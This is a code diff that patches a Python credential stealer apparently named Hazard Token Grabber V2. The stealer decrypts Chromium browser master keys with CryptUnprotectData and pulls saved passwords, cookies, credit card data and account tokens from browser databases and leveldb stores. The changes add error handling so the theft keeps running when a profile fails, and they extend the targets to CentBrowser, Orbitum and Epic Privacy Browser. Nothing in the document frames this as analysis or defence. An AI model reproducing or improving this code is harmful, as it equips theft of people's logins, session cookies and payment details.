@@ -106,8 +106,10 @@ class functions(object):
         with open(path, "r", encoding="utf-8") as f:
             c = f.read()
         local_state = json.loads(c)
-
-        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
+        try:
+            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
+        except:
+            return False
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
@@ -131,7 +133,7 @@ class functions(object):
     @staticmethod
     def findProfiles(name, path):
         folders = []
-        if name in ["Vivaldi", "Chrome", "Uran", "Yandex", "Brave", "Iridium", "Microsoft Edge"]:
+        if name in ["Vivaldi", "Chrome", "Uran", "Yandex", "Brave", "Iridium", "Microsoft Edge", "CentBrowser", "Orbitum", "Epic Privacy Browser"]:
             folders = [element for element in os.listdir(
                 path) if re.search("^Profile*|^Default$", element) != None]
         elif os.path.exists(path + '\\_side_profiles'):
@@ -399,7 +401,7 @@ class Hazard_Token_Grabber_V2(functions):
                 profiles = self.findProfiles(name, path)
                 if profiles == []:
                     path = path + 'Local Storage\\leveldb\\'
-                    profiles = [None]
+                    profiles = ["None"]
                 for profile in profiles:
                     if profile == 'def':
                         path = self.paths[name] + 'Local Storage\\leveldb\\'
@@ -429,7 +431,6 @@ class Hazard_Token_Grabber_V2(functions):
                         for token in findall(self.regex, line):
                             asyncio.run(self.checkToken(token))
 
-    @try_extract
     def grabPassword(self):
         for name, path in self.paths.items():
             localState = path + '\\Local State'
@@ -455,6 +456,8 @@ class Hazard_Token_Grabber_V2(functions):
                 if not os.path.exists(login_db):
                     continue
                 master_key = self.get_master_key(localState)
+                if master_key == False:
+                    continue
                 login = self.dir + self.sep + "Loginvault1.db"
                 shutil.copy2(login_db, login)
                 conn = sqlite3.connect(login)
@@ -479,7 +482,6 @@ class Hazard_Token_Grabber_V2(functions):
                     conn.close()
                     os.remove(login)
 
-    @try_extract
     def grabCookies(self):
         for name, path in self.paths.items():
             localState = path + '\\Local State'
@@ -507,6 +509,8 @@ class Hazard_Token_Grabber_V2(functions):
                     if not os.path.exists(login_db):
                         continue
                 master_key = self.get_master_key(localState)
+                if master_key == False:
+                    continue
                 login = self.dir + self.sep + "Loginvault2.db"
                 shutil.copy2(login_db, login)
                 conn = sqlite3.connect(login)
@@ -785,7 +789,6 @@ class Hazard_Token_Grabber_V2(functions):
                         f.write(
                             f"Domain: {url}\nUser: {name}\nPass: {passw}\n\n")
 
-    @try_extract
     def creditInfo(self):
         for name, path in self.paths.items():
             localState = path + '\\Local State'
@@ -794,7 +797,7 @@ class Hazard_Token_Grabber_V2(functions):
             profiles = self.findProfiles(name, path)
             if profiles == []:
                 login_db = path + '\\Web Data'
-                profiles = [None]
+                profiles = ["None"]
             for profile in profiles:
                 localState = path + '\\Local State'
                 if profile == 'def':
@@ -811,6 +814,8 @@ class Hazard_Token_Grabber_V2(functions):
                 if not os.path.exists(login_db):
                     continue
                 master_key = self.get_master_key(localState)
+                if master_key == False:
+                    continue
                 login = self.dir + self.sep + "Loginvault3.db"
                 shutil.copy2(login_db, login)
                 conn = sqlite3.connect(login)
